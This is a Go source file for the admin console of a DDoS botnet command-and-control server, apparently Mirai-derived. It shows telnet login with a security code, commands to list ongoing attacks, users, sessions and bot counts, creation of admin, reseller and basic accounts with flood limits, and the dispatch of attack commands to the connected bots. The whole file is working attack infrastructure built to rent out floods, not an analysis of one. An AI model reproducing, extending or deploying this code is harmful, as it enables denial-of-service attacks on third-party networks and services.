package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"strconv"
	"strings"
	"time"
	"os"
	"bufio"
	"github.com/alexeyco/simpletable"
)

//either attacks true or false
//this will ensure its done without issues
var GlobalAttacks bool = true

var GlobalSlots = 0
var MaxGlobalSlots = 1
var MaxFloodsForUsers = 400

var previousDistribution map[string]int


type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}


func (session *session) line_counter_attacks(username string) {
	atk_path := "logs/attack-logs/"+ username +"-attack.log"

	file, _ := os.Open(atk_path)
	fileScanner := bufio.NewScanner(file)
	session.Floods = 0
	    for fileScanner.Scan() {
			session.Floods++
		}
		//fmt.Printf("[admin] Attacks total: %d | User %s\n", session.Floods, username)
}                         

func (this *Admin) Slots_Cooldown(username string) {
	GlobalSlots++
	//this.conn.Write([]byte("\033[91m"+username+"\033[93m@\033[97mtbot\033[97m> "))
	for _ = range time.Tick(time.Second * 120) { // 120 default
		GlobalSlots--
		break
	}
}


func (this *Admin) Handle() {
	
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))
	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	//looks for the sample security code
	//this will ensure its done without errors happening
	hiddenCode, err := ioutil.ReadFile("securitycode.item")


	this.conn.Write([]byte("\033[0m\033[2J\033[1H")) //clears menu
	DisplayBanner(this, "login-screen.txt") //simple login menu

	//renders our main login screen properly
	this.conn.Write([]byte(fmt.Sprintf("\033]0;Please enter your credentials.\007")))
	this.conn.Write([]byte("\033[0;32m\r\n"))
	this.conn.Write([]byte("\033[0;32m\r\n"))
	this.conn.Write([]byte("\033[0;32m\r\n"))
	this.conn.Write([]byte("\033[0;32m \r\n"))
	this.conn.Write([]byte("\033[0;37m \r\n\r\n"))
	this.conn.Write([]byte("\r\n                                  \x1b[4m                   \x1b[0m\r\n                       ║Username> \x1b[38;5;15m\x1b[48;5;235m\x1b[4m                   \x1b[0m")) //username //mask
	this.conn.Write([]byte("\r\n                                  \x1b[4m                   \x1b[0m\r\n                       ║Password> \x1b[38;5;15m\x1b[48;5;235m\x1b[4m                   \x1b[0m")) //password mask
	
	//checks for the enable properly
	//this will now follow through properly
	if err == nil && len(string(hiddenCode)) > 0 { //displays our little security code message
		this.conn.Write([]byte("\r\n                                  \x1b[4m                   \x1b[0m\r\n                       ║Security> \x1b[0m\x1b[48;5;235m\x1b[4m                   \x1b[0m"))
	}

	this.conn.Write([]byte("\033[9;35f\x1b[0m\x1b[48;5;235m\x1b[4m"))
	//reads the username input propelry
  	username, err := this.ReadLine(false)
  	if err != nil {
  	  return
  	}

  	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
  	this.conn.Write([]byte("\033[11;35f\x1b[0m\x1b[48;5;235m\x1b[4m"))
  	password, err := this.ReadLine(true)
  	if err != nil {
  	  return
  	}
	//checks for the enable properly
	//this will now follow through properly
	if err == nil && len(string(hiddenCode)) > 0 { //reads our security code input
		//moves the cursor into the texture area properly
		//this will ensure its stays inside the text rule we added
		this.conn.Write([]byte("\033[13;35f\x1b[0m\x1b[48;5;235m\x1b[4m"))
		secCode, err := this.ReadLine(true) //reads the input properly
		if err != nil { //err handles
		  return //kill sessions
		}

		//tries to validate the code properly
		//this will ensure its done iwthout errors
		if string(hiddenCode) != secCode { //validates the sec code
			this.conn.Write([]byte(fmt.Sprintf("\033]0;Invalid Security code!\007")))
			//log.Printf("[eof-security_code] invalid security code given for %s from %s [%s]\r\n", username, this.conn.RemoteAddr().String(), secCode)
			time.Sleep(1000 * time.Millisecond) //waits 1 millisecond properly
			buf := make([]byte, 1) //accepts a 1 charater buffer
			this.conn.Read(buf) //reads from the session
			return //ends the session properly
		}
	}
	this.conn.Write([]byte("\x1b[0m\x1bc"))
	
	//deadline for timeout on password input
	this.conn.SetDeadline(time.Now().Add(120 * time.Second))

	var loggedIn bool
	var userInfo AccountInfo

	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte(fmt.Sprintf("\033]0;Invalid Credentials! \007")))
		time.Sleep(1000 * time.Millisecond)
		this.conn.Write([]byte("\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	} else { //logging in logs system here properly
		log.Printf("[new_login] new login has been recorded for %s from %s\r\n", username, this.conn.RemoteAddr().String())
	}

	time.Sleep(1 * time.Millisecond)

	go func() {
		i := 0
		for {
			var Floods int


			var session = &session{
				ID:       time.Now().UnixNano(),
				Username: username,
				Conn:     this.conn,
				Accunt:   userInfo,
				Floods:   Floods,
			}

			go session.line_counter_attacks(username)


			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			time.Sleep(500 * time.Millisecond)
			if userInfo.admin == 1 {
                if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d - %d/%d\007", BotCount, GlobalSlots, MaxGlobalSlots))); err != nil {
                    this.conn.Close()
                    break
                }
            }
            if userInfo.admin == 0 {
                if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d - %d/%d\007", BotCount, GlobalSlots, MaxGlobalSlots))); err != nil {
                    this.conn.Close()
                    break
                }
            }
			i++
			
			            if i % 2 == 0 {
                this.conn.Write([]byte("\033[?25l"))
            } else {
                this.conn.Write([]byte("\033[?25h\033[?0c"))
            }
		
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()
	var Floods int


	// banner
                        this.conn.Write([]byte("\033[0m\033[2J\033[1H"))
                        DisplayBanner(this, "banner.txt")
            

			var session = &session{
				ID:       time.Now().UnixNano(),
				Username: username,
				Conn:     this.conn,
				Accunt:   userInfo,
				Floods:   Floods,
			}
		

	sessionMutex.Lock()
	sessions[session.ID] = session
	sessionMutex.Unlock()

	defer session.Remove()

	for {
		var botCatagory string
		var botCount int
		go session.line_counter_attacks(username)
        this.conn.Write([]byte("\033[0m" + username + "~$ "))
		cmd, err := this.ReadLine(false)
		
        if err != nil || cmd == "clear" || cmd == "cls" {
                        this.conn.Write([]byte("\033[0m\033[2J\033[1H"))
                        DisplayBanner(this, "banner.txt")
            
	continue
        }
		if err != nil || cmd == "LOGOUT" || cmd == "logout" || cmd == "EXIT" || cmd == "exit" {
			return
		}
        if err != nil || cmd == "?" || cmd == "help" || cmd == "HELP" || cmd == "methods" {

            DisplayBanner(this, "help.txt")
            continue
        }
		//gets all the possible ongoing attacks safely
		//this will ensure its done without errors happening
		if err != nil || strings.Split(strings.ToLower(cmd), " ")[0] == "ongoing" {
					if userInfo.admin == 0 {
				fmt.Fprint(this.conn, "\033[91mYou don't have the permission to execute this Command!\r\n")
				continue
			}

			//gets all ongoing attacks properly
			//this will ensure its done without errors
			currently, err := database.Ongoing()
			if err != nil { //err handles
				continue
			}

			newest := simpletable.New() //simpletable holder

			newest.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{ //sets the values properly without issues happening
					{Align: simpletable.AlignCenter, Text: "\x1b[0m"+"#"+"\033[0;32m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m"+"method"+"\033[0;32m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m"+"target"+"\033[0;32m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m"+"duration"+"\033[0;32m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m"+"length"+"\033[0;32m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m"+"user"+"\033[0;32m"},
				},
			}

			//ranges through ongoing attacks properly
			for poc, attacks := range currently { //ranges

				//gets the username from the id properly
				//this will ensure we can fetch information
				attackingUser, err := database.GetUserID(attacks.UserID)
				if err != nil {
					continue
				}
	

				rk := []*simpletable.Cell{ 
					{Align: simpletable.AlignCenter, Text: "\x1b[0m"+strconv.Itoa(poc)+"\033[0;32m"}, //username
					{Align: simpletable.AlignCenter, Text: "\x1b[0m"+strings.Split(attacks.Command, " ")[0]+"\033[0;32m"}, //maxtime
					{Align: simpletable.AlignCenter, Text: "\x1b[0m"+strings.Split(attacks.Command, " ")[1]+"\033[0;32m"}, //admins
					{Align: simpletable.AlignCenter, Text: "\x1b[0m"+strconv.Itoa(attacks.Duration)+"\033[0;32m"}, //admins
					{Align: simpletable.AlignCenter, Text: "\x1b[0m"+fmt.Sprintf("%.2fsecs", time.Until(time.Unix(attacks.Attacked + int64(attacks.Duration), 64)).Seconds())+"\033[0;32m"}, //max attack time
					{Align: simpletable.AlignCenter, Text: "\x1b[0m"+attackingUser.username+"\033[0;32m"}, //max attack time
				}

				newest.Body.Cells = append(newest.Body.Cells, rk) //appends properly
			}

			//new style here properly and safely
			newest.SetStyle(simpletable.StyleUnicode) //renders table properly
			this.conn.Write([]byte("\033[0;32m"+strings.ReplaceAll(newest.String(), "\n", "\r\n")+"\r\n"))
			continue
		}


		//displays all users inside the database properly
		if err != nil || strings.Split(strings.ToLower(cmd), " ")[0] == "users" {
			if userInfo.admin == 1 || userInfo.Reseller == 1 {
				this.conn.Write([]byte("\033[0;32m")) // system clears
	
				// stores all of the users properly
				// this will ensure it's done without errors
				active_users, err := database.Users() // database
				if err != nil { // err handles properly
					continue
				}
	
				newest := simpletable.New() // simpletable holder
	
				newest.Header = &simpletable.Header{
					Cells: []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "username" + "\033[0;32m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "count access" + "\033[0;32m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "admin" + "\033[0;32m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "reseller" + "\033[0;32m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "attacks" + "\033[0;32m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "maxtime" + "\033[0;32m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "cooldown" + "\033[0;32m"},
					},
				}
	
				for _, user := range active_users {
					var admin = "\x1b[48;5;9m\x1b[38;5;16m FALSE \x1b[0m" // false
					if user.admin == 1 {
						admin = "\x1b[48;5;10m\x1b[38;5;16m TRUE \x1b[0m" // true
					}
	
					var reseller = "\x1b[48;5;9m\x1b[38;5;16m FALSE \x1b[0m" // false
					if user.Reseller == 1 {
						reseller = "\x1b[48;5;10m\x1b[38;5;16m TRUE \x1b[0m" // true
					}
	
					var maxtime_info string = strconv.Itoa(user.maxBots)
					if user.maxBots == -1 {
						maxtime_info = "unlimited"
					}
	
					rk := []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: "\x1b[0m" + user.username + "\033[0;32m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[0m" + maxtime_info + "\033[0;32m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[0m" + admin + "\033[0;32m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[0m" + reseller + "\033[0;32m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[0m" + strconv.Itoa(database.fetchAttacks(user.ID)) + "\033[0;32m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[0m" + strconv.Itoa(user.MaxTime) + "\033[0;32m"},
						{Align: simpletable.AlignCenter, Text: "\x1b[0m" + strconv.Itoa(user.Cooldown) + "\033[0;32m"},
					}
	
					newest.Body.Cells = append(newest.Body.Cells, rk)
				}
	
				newest.SetStyle(simpletable.StyleUnicode)
				this.conn.Write([]byte(strings.ReplaceAll(newest.String(), "\n", "\r\n") + "\r\n"))
				continue
			} else {
				fmt.Fprint(this.conn, "\033[91mYou don't have the permission to execute this Command!\r\n")
				continue
			}
		}

		if err != nil || strings.ToLower(strings.Split(cmd, " ")[0]) == "sessions"  {
			if userInfo.admin == 0 {
				fmt.Fprint(this.conn, "\033[91mYou don't have the permission to execute this Command!\r\n")
				continue
			}
			
			this.conn.Write([]byte("\033[0;32m"))

			newest := simpletable.New() //simpletable holder


			newest.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{ //sets the values properly without issues happening
					{Align: simpletable.AlignCenter, Text: "\x1b[0m"+"username"+"\033[0;32m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m"+"count access"+"\033[0;32m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m"+"admin"+"\033[0;32m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m"+"attacks"+"\033[0;32m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m"+"ip"+"\033[0;32m"},
				},
			}

			for _, s := range sessions { //ranges through

				var admin = "\x1b[48;5;9m\x1b[38;5;16m FALSE \x1b[0m" //false
				if s.Accunt.admin == 1 { //checks admin status properly
					admin = "\x1b[48;5;10m\x1b[38;5;16m TRUE \x1b[0m" //true
				}

				var maxtime_info string = strconv.Itoa(s.Accunt.maxBots)
				if s.Accunt.maxBots == -1 { //works out a word for infinite
					maxtime_info = "unlimited" //unlimited bot access
				}
				
				rk := []*simpletable.Cell{ 
					{Align: simpletable.AlignCenter, Text: "\x1b[0m"+s.Accunt.username+"\033[0;32m"}, //username
					{Align: simpletable.AlignCenter, Text: "\x1b[0m"+maxtime_info+"\033[0;32m"}, //maxtime
					{Align: simpletable.AlignCenter, Text: "\x1b[0m"+admin+"\033[0;32m"}, //admins
					{Align: simpletable.AlignCenter, Text: "\x1b[0m"+strconv.Itoa(database.fetchAttacks(s.Accunt.ID))+"\033[0;32m"}, //admins
					{Align: simpletable.AlignCenter, Text: "\x1b[0m"+strings.Split(s.Conn.RemoteAddr().String(), ":")[0]+"\033[0;32m"}, //ip
				}

				newest.Body.Cells = append(newest.Body.Cells, rk) //appends properly
			}

			//new style here properly and safely
			newest.SetStyle(simpletable.StyleUnicode) //renders table properly
			this.conn.Write([]byte(strings.ReplaceAll(newest.String(), "\n", "\r\n")+"\r\n"))
			continue
		}

		if userInfo.admin == 1 && (cmd == "bots") {
			botCount = clientList.Count()
			m := clientList.Distribution()
		
			if previousDistribution != nil {
				for k, v := range m {
					change := v - previousDistribution[k]
					changeSign := ""
					colorCode := "92" // Default color for positive changes
		
					if change > 0 {
						changeSign = "+"
					} else if change < 0 {
						changeSign = ""
						colorCode = "91" // Red color for negative changes
					}
		
					message := fmt.Sprintf("%s: %d (%s%s%d\x1b[0m)\r\n", k, v, "\x1b["+colorCode+"m", changeSign, change)
					this.conn.Write([]byte(message))
				}
			} else {
				for k, v := range m {
					message := fmt.Sprintf("%s: %d\r\n", k, v)
					this.conn.Write([]byte(message))
				}
			}
		
			previousDistribution = m
			continue
		}
		if userInfo.admin == 0 && cmd == "clearlogs" {
            this.conn.Write([]byte("\033[91myou are not admin.\r\n"))
            continue
        }

        if userInfo.admin == 1 && cmd == "clearlogs"  {
            this.conn.Write([]byte("\033[1;91mClear attack logs from database? (better for stability) \033[1;33m?(y/n): \033[0m"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CleanLogs() {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;31mError, can't clear logs, please check debug logs\r\n")))
            } else {
                this.conn.Write([]byte("\033[1;92mAll Attack logs has been cleaned !\r\n"))
                fmt.Println("\033[1;91m[\033[1;92mServerLogs\033[1;91m] Logs has been cleaned by \033[1;92m" + username + " \033[1;91m!\r\n")
            }
            continue 
        }
		if cmd == "" {
			continue
		}

		if (userInfo.admin == 1 || userInfo.Reseller == 1) && strings.ToLower(cmd) == "addbasic" {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("-1 for Full Attack Network\r\n"))
			this.conn.Write([]byte("Allowed Bots: "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for INFINITE time. \r\n"))
			this.conn.Write([]byte("Allowed Duration: "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for no cooldown. \r\n"))
			this.conn.Write([]byte("Cooldown: "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("Username: " + new_un + "\r\n"))
			this.conn.Write([]byte("Password: " + new_pw + "\r\n"))
			this.conn.Write([]byte("Duration: " + duration_str + "\r\n"))
			this.conn.Write([]byte("Cooldown: " + cooldown_str + "\r\n"))
			this.conn.Write([]byte("Network: " + max_bots_str + "\r\n"))
			this.conn.Write([]byte(""))
			this.conn.Write([]byte("Confirm: "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.createUser(new_un, new_pw, max_bots, duration, cooldown, 0) {
				this.conn.Write([]byte("\033[92mFailed to create User! \r\n"))
			} else {
				this.conn.Write([]byte("\033[92mUser created! \r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && strings.ToLower(cmd) == "addreseller" {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("-1 for Full Attack Network\r\n"))
			this.conn.Write([]byte("Allowed Bots: "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for INFINITE time. \r\n"))
			this.conn.Write([]byte("Allowed Duration: "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for no cooldown. \r\n"))
			this.conn.Write([]byte("Cooldown: "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("Username: " + new_un + "\r\n"))
			this.conn.Write([]byte("Password: " + new_pw + "\r\n"))
			this.conn.Write([]byte("Duration: " + duration_str + "\r\n"))
			this.conn.Write([]byte("Cooldown: " + cooldown_str + "\r\n"))
			this.conn.Write([]byte("Network: " + max_bots_str + "\r\n"))
			this.conn.Write([]byte(""))
			this.conn.Write([]byte("Confirm: "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.createUser(new_un, new_pw, max_bots, duration, cooldown, 1) {
				this.conn.Write([]byte("\033[92mFailed to create User! \r\n"))
			} else {
				this.conn.Write([]byte("\033[92mUser created! \r\n"))
			}
			continue
		}

		//view information about the users plan properly
		//this will ensure its done without any possible errors
		if userInfo.admin == 1 && strings.Split(cmd, " ")[0] == strings.ToLower("plan") {

			this.conn.Write([]byte(fmt.Sprintf("\x1b[0mUser: %s\r\n", userInfo.username))) //username
			this.conn.Write([]byte(fmt.Sprintf("\x1b[0mMaxBots: %d\r\n", userInfo.maxBots))) //maxbots
			this.conn.Write([]byte(fmt.Sprintf("\x1b[0mMaxTime: %d\r\n", userInfo.MaxTime))) //maxtime
			this.conn.Write([]byte(fmt.Sprintf("\x1b[0mCooldown: %d\r\n", userInfo.Cooldown))) //cooldown
			if userInfo.admin == 1 { //an admin user
				this.conn.Write([]byte(fmt.Sprintf("\x1b[0mAdmin: %s\r\n", "\x1b[38;5;2mtrue\x1b[0m")))
			} else { //not an admin user
				this.conn.Write([]byte(fmt.Sprintf("\x1b[0mAdmin: %s\r\n", "\x1b[38;5;1mfalse\x1b[0m")))
			}; continue //continues looping properly
		}


		//enable or disable attacks properly here
		//this will ensure its done without errors happening
		if userInfo.admin == 1 && strings.Split(cmd, " ")[0] == strings.ToLower("attacks") {

			//invalid syntax given properly
			//this will ensure its done without errors
			if len(strings.Split(cmd, " ")) <= 1 { //length
				this.conn.Write([]byte("\x1b[0msyntax: attacks <status(\x1b[38;5;10menable\x1b[0m/\x1b[38;5;9mdisable\x1b[0m)>\r\n"))
				continue //continues looping properly
			}

			//lowers the system properly and safely
			//this will ensure we have split into sections
			switch strings.ToLower(strings.Split(cmd, " ")[1]) {

			case "enable", "true":
				GlobalAttacks = true //enable
				this.conn.Write([]byte("\x1b[38;5;10mattack has been enabled properly\x1b[0m\r\n")); continue
			case "disable", "false":
				GlobalAttacks = false //disable
				this.conn.Write([]byte("\x1b[38;5;9mattack has been disabled properly\x1b[0m\r\n")); continue
			}
		}

		if userInfo.admin == 1 && cmd == strings.ToLower("addadmin") {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("-1 for Full Attack Network.\r\n"))
			this.conn.Write([]byte("Allowed Bots: "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for Infinite flood time. \r\n"))
			this.conn.Write([]byte("Allowed Duration: "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for no cooldown. \r\n"))
			this.conn.Write([]byte("Cooldown: "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("Username: " + new_un + "\r\n"))
			this.conn.Write([]byte("Password: " + new_pw + "\r\n"))
			this.conn.Write([]byte("Duration: " + duration_str + "\r\n"))
			this.conn.Write([]byte("Cooldown: " + cooldown_str + "\r\n"))
			this.conn.Write([]byte("Networ: " + max_bots_str + "\r\n"))
			this.conn.Write([]byte(""))
			this.conn.Write([]byte("Confirm: "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.createAdmin(new_un, new_pw, max_bots, duration, cooldown, 0) {
				this.conn.Write([]byte("Failed to create User! \r\n"))
			} else {
				this.conn.Write([]byte("User created! \r\n"))
			}
			continue
		}
		if (userInfo.admin == 1 || userInfo.Reseller == 1) && cmd == strings.ToLower("removeuser") {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if !database.removeUser(new_un) {
				this.conn.Write([]byte("User doesn't exists.\r\n"))
			} else {
				this.conn.Write([]byte("User removed\r\n"))
			}
			continue
		}

        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)

            if len(cataSplit) > 1 {
	            botCatagory = cataSplit[0][1:]
	            cmd = cataSplit[1]
            }
        }

		botCount = userInfo.maxBots
		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err.Error())))
		} else {
			if !GlobalAttacks { //disabled attacks currently and properly
				this.conn.Write([]byte("\x1b[38;5;9mattacks are currently disabled! check back later...\x1b[0m\r\n"))
				continue //continues looping properly
			}
			if session.Floods >= MaxFloodsForUsers {
				this.conn.Write([]byte("\x1b[38;5;9mYou have used all your attacks, contact a admin\x1b[0m\r\n"))
				continue //continues looping properly
			}
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err.Error())))
			} else {
				if GlobalSlots >= MaxGlobalSlots {
					this.conn.Write([]byte(fmt.Sprintf("All attack slots are in use.\r\n")))
					continue
				}
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					buf1, _ := atk.Build16()
					go this.Slots_Cooldown(username)
					timenow := time.Now()

					filename := "logs/attack-logs/"+ username +"-attack.log"
			
					file, err := os.OpenFile(filename ,os.O_RDWR|os.O_APPEND|os.O_CREATE, 0777)
					if err != nil {
						fmt.Println(err)
						return
					}
					defer file.Close()
					fmt.Fprintf(file, "User=%s | Duration=%d | Cmd=%s | Botcount=%d | %s\r\n", username, atk.Duration, cmd, botCount, timenow)
					file.Close()
                    this.conn.Write([]byte(fmt.Sprintf("Sent command to %d clients\r\n", clientList.Count())))
                    clientList.QueueBuf(buf, buf1, botCount, botCatagory)

                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}


func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1024)
	bufPos := 0

	for {
		//system controls buffer properly
		if bufPos >= len(buf) - 1 { //ends looping
			this.conn.Write([]byte("\r\n"))
			return string(buf), nil 
		}

		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte("\b \b"))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("\r"))
			return "", nil
		} else {
			if buf[bufPos] == '\033' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}

func isAdmin(userInfo AccountInfo) bool {
	if userInfo.admin == 1 {
		return true
	}
	return false
}

func getRank(userInfo AccountInfo) string {
	if userInfo.admin == 1 {
		return "Admin"
	}
	return "User"
}
